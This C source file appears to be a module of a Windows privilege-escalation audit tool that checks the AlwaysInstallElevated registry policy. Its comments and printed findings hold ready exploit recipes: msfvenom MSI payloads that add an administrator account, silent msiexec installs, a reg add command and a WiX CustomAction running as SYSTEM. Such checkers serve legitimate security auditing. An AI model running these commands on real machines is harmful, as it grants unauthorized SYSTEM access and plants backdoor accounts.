/*
 * always_install_elevated.c — AlwaysInstallElevated MSI Privilege Escalation
 *
 * VULNERABILITY CLASS:
 *   When the following two registry values are both set to 1:
 *     HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
 *     HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
 *
 *   Windows Installer (msiexec.exe) runs ALL MSI packages with elevated
 *   (SYSTEM) privileges, regardless of who triggered the installation.
 *   Any low-privilege user can create a malicious MSI and run it as SYSTEM.
 *
 * SEVERITY: CRITICAL when both keys set.
 *           HIGH if only HKCU set (may still be exploitable on some versions).
 *           MEDIUM if only HKLM set (requires user-side policy too).
 *
 * MSI PAYLOAD CREATION:
 *   The simplest payload: a CustomAction in an MSI that runs a command as SYSTEM.
 *
 *   Tools to create payload MSI:
 *   - msfvenom: msfvenom -p windows/exec CMD="net user evil P@ss /add" -f msi
 *   - msi_gen.py (custom): creates MSI with SYSTEM CustomAction
 *   - wix toolset: build MSI with <CustomAction Execute="deferred" Impersonate="no">
 *
 * ADDITIONAL CHECKS:
 *   - 64-bit vs 32-bit registry hive (Wow6432Node)
 *   - Group Policy Objects may also configure this
 *   - Installer service (msiserver) running state
 *
 * REFERENCES:
 *   MITRE ATT&CK: T1218.007 — Msiexec
 *   MITRE ATT&CK: T1548.002 — Abuse Elevation Control Mechanism: Bypass UAC
 *   https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated
 *   PowerSploit: Get-RegistryAlwaysInstallElevated
 *   WinPEAS: check_alwaysinstallelevated()
 */

#include "../common.h"

#define KEY_HKCU L"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
#define KEY_HKLM L"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
#define KEY_HKLM_WOW L"SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\Installer"
#define VALUE_AIE L"AlwaysInstallElevated"

static BOOL CheckAIEValue(HKEY hRoot, LPCWSTR subKey, LPCWSTR label, DWORD *out) {
    HKEY hKey = NULL;
    if (RegOpenKeyExW(hRoot, subKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        *out = 0;
        return FALSE;
    }
    DWORD val = 0, cb = sizeof(val), type = 0;
    BOOL ok = (RegQueryValueExW(hKey, VALUE_AIE, NULL, &type,
                                (LPBYTE)&val, &cb) == ERROR_SUCCESS
               && type == REG_DWORD);
    RegCloseKey(hKey);
    *out = ok ? val : 0;
    PrintInfo(L"  %-55s = %s\n", label, ok ? (val ? L"1 [SET]" : L"0") : L"(not set)");
    return ok;
}

void Module_AlwaysInstallElevated(void) {
    PrintHeader(L"ALWAYSINSTALLELEVATED  [MSI SYSTEM-level install for any user]");

    PrintInfo(
        L"  Checks if MSI packages can be installed with SYSTEM privileges by any user.\n"
        L"  Requires: HKCU + HKLM AlwaysInstallElevated both = 1.\n\n");

    DWORD hkcuVal = 0, hklmVal = 0, hklmWowVal = 0;

    CheckAIEValue(HKEY_CURRENT_USER,  KEY_HKCU,     L"HKCU: AlwaysInstallElevated", &hkcuVal);
    CheckAIEValue(HKEY_LOCAL_MACHINE, KEY_HKLM,     L"HKLM: AlwaysInstallElevated", &hklmVal);
    CheckAIEValue(HKEY_LOCAL_MACHINE, KEY_HKLM_WOW, L"HKLM (WOW64): AlwaysInstallElevated", &hklmWowVal);

    PrintInfo(L"\n");

    BOOL hkcu = (hkcuVal == 1);
    BOOL hklm = (hklmVal == 1 || hklmWowVal == 1);

    if (hkcu && hklm) {
        Finding f;
        f.severity = SEV_CRITICAL;
        wcscpy(f.module, L"MSI_INSTALL");
        wcscpy(f.target, L"[CRITICAL] AlwaysInstallElevated ENABLED — both HKCU + HKLM");
        wcscpy(f.reason,
            L"BOTH AlwaysInstallElevated keys are set to 1. "
            L"Any user can install ANY MSI package as NT AUTHORITY\\SYSTEM. "
            L"EXPLOIT: "
            L"(1) msfvenom -p windows/exec CMD=\"net user evil P@ss! /add && net localgroup administrators evil /add\" -f msi -o evil.msi "
            L"(2) msiexec /quiet /qn /i evil.msi "
            L"(3) msiexec executes payload as SYSTEM. "
            L"Alt: msi_gen.py or WiX Toolset CustomAction Execute=deferred Impersonate=no.");
        PrintFinding(&f);
    } else if (hkcu && !hklm) {
        Finding f;
        f.severity = SEV_HIGH;
        wcscpy(f.module, L"MSI_INSTALL");
        wcscpy(f.target, L"[HIGH] AlwaysInstallElevated — HKCU set, HKLM not set");
        wcscpy(f.reason,
            L"HKCU AlwaysInstallElevated=1 but HKLM is not set. "
            L"On some Windows versions / with certain policy relaxation, "
            L"HKCU alone may enable elevated MSI installs. "
            L"Verify: create test MSI with SYSTEM write → msiexec /i test.msi "
            L"If it writes to C:\\Windows\\Temp as SYSTEM → exploitable. "
            L"Fix: remove HKCU key.");
        PrintFinding(&f);
    } else if (!hkcu && hklm) {
        Finding f;
        f.severity = SEV_MEDIUM;
        wcscpy(f.module, L"MSI_INSTALL");
        wcscpy(f.target, L"[MEDIUM] AlwaysInstallElevated — HKLM set, HKCU not set");
        wcscpy(f.reason,
            L"HKLM AlwaysInstallElevated=1 but HKCU is not set. "
            L"Exploitation requires setting the HKCU key (writable by current user). "
            L"Attack: reg add HKCU\\...\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 "
            L"then proceed with MSI exploit. "
            L"Or: if another mechanism to set HKCU exists.");
        PrintFinding(&f);
    } else {
        PrintInfo(L"  AlwaysInstallElevated: NOT enabled (both keys absent or 0).\n");
    }

    PrintInfo(
        L"\n  MSI PAYLOAD CREATION REFERENCE:\n"
        L"    msfvenom:  msfvenom -p windows/x64/exec CMD=calc.exe -f msi -o payload.msi\n"
        L"    Custom WiX: <CustomAction Id='CA_Payload' Execute='deferred'\n"
        L"                              Impersonate='no' Return='ignore'\n"
        L"                              ExeCommand='cmd.exe /c net user evil P@ss /add' />\n"
        L"    PowerShell: Invoke-AllChecks (PowerSploit) → Write-UserAddMsi\n"
        L"    Execution:  msiexec /quiet /qn /i payload.msi\n");
}
